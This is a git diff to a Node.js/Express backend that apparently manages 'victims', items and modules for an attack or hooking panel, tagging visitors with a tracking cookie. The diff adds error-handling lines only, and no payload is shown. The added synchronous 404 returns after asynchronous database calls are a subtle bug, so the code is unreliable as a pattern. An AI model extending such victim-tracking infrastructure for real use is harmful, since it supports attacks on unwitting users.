@@ -69,6 +69,7 @@ app.all('/i/', function(req, res){
         };
         //  若数据库内无Victim，则创建之
         sql.Item.findById(id, function(err, info){
+            if(!info){return null};
             who = getmd5(info.owner+id+Date.now());
             res.cookie('who', who);
             //  继承item的配置
@@ -87,6 +88,7 @@ app.all('/i/', function(req, res){
             });
         });
     });
+    return err404(req, res);
 });
 function handle(re, modules, owner, victim, who, type){
     //  处理服务端模块
@@ -115,6 +117,7 @@ function httppage(req, res){
         var owner = req.session.user&&(req.session.user.name == info.owner);
         handle({q:req, s:res}, info.modules, owner, sql.Victim, who, 'http');
     });
+    return err404(req, res);
 };
 function online(who, on){
     //  是否在线？
@@ -195,6 +198,7 @@ app.get('/home', function(req, res){
             });
         });
     });
+    return err404(req, res);
 });
 
 app.get('/home/item/:name', function(req, res){
@@ -204,6 +208,7 @@ app.get('/home/item/:name', function(req, res){
             items:info
         });
     });
+    return err404(req, res);
 });
 app.get('/home/victim/:name', function(req, res){
     sql.Victim.findOne({id:req.params.name}, function(err, info){
@@ -212,6 +217,7 @@ app.get('/home/victim/:name', function(req, res){
             victims:info
         });
     });
+    return err404(req, res);
 });
 app.get('/home/page/:uri/edit', function(req, res){
     sql.Page.findOne({uri:req.params.uri}, function(err, info){
@@ -220,6 +226,7 @@ app.get('/home/page/:uri/edit', function(req, res){
             pages:info
         });
     });
+    return err404(req, res);
 });
 
 app.post('/home/victim/:id/edit', function(req, res){
@@ -280,6 +287,7 @@ app.all('/home/modules', function(req, res){
     if(type=='victim'){
         //TODO
     };
+    return err404(req, res);
 });
 
 app.use('*', err404);
